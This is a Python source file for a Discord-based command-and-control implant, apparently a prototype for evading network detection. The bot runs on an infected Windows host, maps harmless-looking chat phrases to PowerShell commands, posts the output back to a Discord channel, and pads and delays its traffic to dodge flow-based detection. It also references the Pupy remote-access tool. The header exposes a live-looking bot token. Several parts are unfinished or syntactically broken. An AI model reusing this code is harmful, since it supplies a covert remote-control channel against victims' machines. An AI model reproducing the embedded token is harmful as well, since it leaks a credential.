

"""
This program will act as a Discord bot to read and write information to the discord channel on the infected host.
Client ID: 497092391811940362
Bot name: NN-C2-EVASION
Bot token: NDk3MDkyMzkxODExOTQwMzYy.DpaJOw.ZTOGEIVJfuYPKs4cp3lk71L0T_c
Permissions integer: 8
"""

import asyncio
import aiohttp
import json, time
from discord import Game
import discord
from discord.ext.commands import Bot
#from pupylib.PupyModule import config, PupyArgumentParser, PupyModule
import random, subprocess, logging, hashlib, sched
from NetworkFlow import NetworkFlow
from concurrent.futures import ProcessPoolExecutor, Future
from collections import deque

BOT_PREFIX = ("?", "!")


TOKEN = "" # Get at discordapp.com/developers/applications/me

with open("tokenfile", "r") as f:
    TOKEN = f.readline().strip("\n")
    print(TOKEN)

m = hashlib.md5()
host_id = TOKEN.encode("utf-8")
print("Host ID:", host_id)
m.update(host_id)
ID = m.hexdigest()
print(ID)

s = sched.scheduler(time.time, time.sleep)


class TimeoutException(Exception):
    pass

class MalwareReceiver:

    def __init__(self):

        self.instructor_available = False
        self.active = False
        self.instruction_set = None
        self.is_blocked = False
        self.instructionSetAliases = {
            "oy mate" : "pingback",
            "pls respond" : "pingback",
            "you wanna go mate?" : "pingback",
            "good to hear from you!" : "pingback",
            "hi there! :)" : "pingback"
        }
        self.instructionSetPupy = {"pingback" : "pwd"}

        self.perturbationParams = {
            "MaxPacketSizeBytes" : 100,
            "TimeDeltaMs" : 1000,
            "NetworkFlowDuration" : 17,
            "CommandDelay" : 3,
            "OfflineDuration" : 10,
            "HeartbeatDelay" : 2,
            "ReplyDelay"
        }

        self.NetworkFlow = None

        logging.basicConfig(filename="perturbationLog.txt", level=logging.DEBUG)

        self.client = Bot(command_prefix=BOT_PREFIX)
        self.setup()


    def setup(self):

        @self.client.event
        @asyncio.coroutine
        async def on_ready():
            print('Logged in as')
            print(self.client.user.name + "\n" + self.client.user.id + "\n--------")
            print(random.sample(list(self.instructionSetAliases.keys()), 2))
            self.NetworkFlow = NetworkFlow()
            tmpLoop = asyncio.get_event_loop()
            print(tmpLoop)
            await heartbeat()
            print("After heartbeat loop initiated.")

        @self.client.event
        @asyncio.coroutine
        async def on_message(message):
            channel = message.channel
            if message.content[1:] in self.instructionSetAliases:
                proc = subprocess.Popen(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", ";", "&pwd"], stdout=subprocess.PIPE)
                output = proc.stdout.read()
                print(len(output))
                #print(str(output.ljust(100, u'A')))
                await self.client.send_message(channel, str(output).ljust(100, u'A'))
            elif message.attachments:
                perturbation_payload = message.attachments[0]

        async def get_network_params()

        async def heartbeat():
            print("Entered heartbeat loop.")
            time.sleep(self.perturbationParams["HeartbeatDelay"])
            if int(time.time() - self.NetworkFlow.get_startflowtime()) >= self.perturbationParams["NetworkFlowDuration"]:
                print("Network flow duration expired")
                logging.debug("Network flow duration expired")
                self.client.logout()
                self.waitfor_flowtime(self.client, self.perturbationParams["OfflineDuration"])
                return
            else:
                #send this to prepare_message instead
                print("Network flow duration not yet expired")
                logging.debug("Network flow duration not yet expired")
                await self.prepare_message(ID)
                print("Message sent.")

            await heartbeat()

        self.run()


        #@self.client.event
        #@asyncio.coroutine
        #async def delayed_padded_message(channel, message):


    def run(self):
        #ex = ProcessPoolExecutor(1)
        #exitTask = self.client.loop.create_task(self.waitfor_flowtime(self.client, 5))
        tmpLoop = asyncio.get_event_loop()
        try:
            #self.client.loop.run_in_executor(ex, self.client.run(TOKEN))
            self.client.run(TOKEN)
            #self.waitfor_flowtime(self.client, 10)
            #self.client.loop.run_until_complete(asyncio.wait_for(self.waitfor_flowtime(self.client.loop, 5), timeout=5.0))
            tmpLoop.run_in_executor(None, waitfor_flowtime, 10)
        except Exception as e:
            #self.client.loop.run_until_complete(self.client.logout())
            logging.debug("Error logging in. Client disconnected.")
            self.client.close()


        #self.client.run(TOKEN)
    def waitfor_flowtime(self, client, seconds):
        print("Sleeping ...")
        time.sleep(seconds)
        print("Slept.")
        self.client.close()
        time.sleep(self.perturbationParams["OfflineDuration"])
        self.setup()
        #await client.logout()
        #ex = ProcessPoolExecutor(1)
        #yield from loop.run_in_executor(ex, time.sleep, seconds)

    def listen(self):
        time.sleep(1)


    @asyncio.coroutine
    async def prepare_message(self, message):
        #Add appropriate padding
        print("Preparing message, delaying ...")
        time.sleep(self.perturbationParams["CommandDelay"])
        print("Delayed. Sending message to channel ...", self.client.get_channel("general"))
        channel = None
        for i in self.client.get_all_channels():
            if i.name == "general":
                channel = i
        print("Available channels: ", [print(i) for i in self.client.get_all_channels()])
        await self.client.send_message(channel, message)



    async def check_instructor_availability(self):
        """
        Sends a message to the discord channel. Based on the response, evaluate whether the instructor is available.
        """
        print(self.instructor_available)

    async def check_if_new_messages(self):
        return len(self.client.messages) > 0


    """
    These below two methods could possibly exist in a feedback loop.
    """
    async def request_instruction_set(self):
        """
        Let the instructor know that the malware is awaiting further instructions.
        """
        active = True
        while active:
            time.sleep(0.5)
            while len(self.client.messages) != 0:
                message = self.client.messages.pop()
                if message in self.instructionSetAliases:
                    execute_instruction_set(self.instructionSetAliases[message])

            self.check_if_blocked()
        print("Waiting for instructions ...")

    async def execute_instruction_set(self, instruction):
        """
        Executes the instructions received and generates report and feedback for the control server.
        Must enable the pupy client prior to running the "remote" command.
        """
        if instruction == "pwd":
            instructionObj = pwd(None)
            output = instructionObj.run()
            if output != None:
                self.check_if_blocked()
                self.generate_report("pwd")
            self.check_if_blocked()
        print()

    async def check_if_blocked(self):
        print()

    @asyncio.coroutine
    async def list_servers():
        await client.wait_until_ready()
        while not client.is_closed:
            print("Current servers:")
            for server in client.servers:
                print(server.name)
            await asyncio.sleep(600)

testclient = MalwareReceiver()
